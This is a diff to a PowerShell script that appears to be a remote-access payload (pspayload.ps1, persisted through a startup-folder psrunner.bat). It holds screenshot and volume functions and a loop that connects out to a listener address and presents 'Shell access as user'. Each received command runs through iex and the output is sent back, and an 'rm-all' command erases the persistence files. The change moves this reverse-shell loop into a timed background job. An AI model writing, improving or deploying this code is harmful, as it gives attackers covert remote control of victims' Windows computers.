@@ -5,39 +5,43 @@ function screenshot(){Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 Function volume($v){$sh = new-object -com wscript.shell;1..50|%{$sh.SendKeys([char]174)};1..$v|%{$sh.SendKeys([char]175)}}
 while($true){
 	try{
-		$socket = new-object System.Net.Sockets.TcpClient("[LISTENER_ADDRESS]", [LISTENER_PORT]);
-		if($socket -eq $null){throw}
-		$stream = $socket.GetStream();
-		$writer = new-object System.IO.StreamWriter($stream);
-		$buffer = new-object System.Byte[] 1024;
-		$encoding = new-object System.Text.UTF8Encoding;
-		$writer.Write("Shell access as user $env:username.`r`n");
-		cd ~
-		do{
-			$writer.Write("> ");
-			$writer.Flush() ;
-			$read = $null;
-			while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
-			$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-			$out_split = $out -split " ";
-			if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all")){
-				try{
-					$res = iex $out -ErrorAction Stop
-					$writer.Write($res -join "`r`n")
-				} catch {$writer.Write("error")}
-				$writer.Write("`r`n")
-			}
-			if($out.equals("rm-all")){
-				rm -Force "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat"
-				rm -Force "~/pspayload.ps1"
-				$writer.close()
-				$socket.close()
-				stop-process -Force -name powershell
-			}
-		} While (!$out.equals("exit"))
-		$writer.close()
-		$socket.close()
-		throw
+		$job=start-job -scriptblock {
+			$socket = new-object System.Net.Sockets.TcpClient("[LISTENER_ADDRESS]", [LISTENER_PORT]);
+			if($socket -eq $null){throw}
+			$stream = $socket.GetStream();
+			$writer = new-object System.IO.StreamWriter($stream);
+			$buffer = new-object System.Byte[] 1024;
+			$encoding = new-object System.Text.UTF8Encoding;
+			$writer.Write("Shell access as user $env:username.`r`n");
+			cd ~
+			do{
+				$writer.Write("> ");
+				$writer.Flush() ;
+				$read = $null;
+				while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
+				$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+				$out_split = $out -split " ";
+				if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all")){
+					try{
+						$res = iex $out -ErrorAction Stop
+						$writer.Write($res -join "`r`n")
+					} catch {$writer.Write("error")}
+					$writer.Write("`r`n")
+				}
+				if($out.equals("rm-all")){
+					rm -Force "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat"
+					rm -Force "~/pspayload.ps1"
+					$writer.close()
+					$socket.close()
+					stop-process -Force -name powershell
+				}
+			} While (!$out.equals("exit"))
+			$writer.close()
+			$socket.close()
+			throw
+		}
+		$job | wait-job -timeout 240
+		$job | stop-job
 	}catch {
 		sleep -Seconds 10
 	}
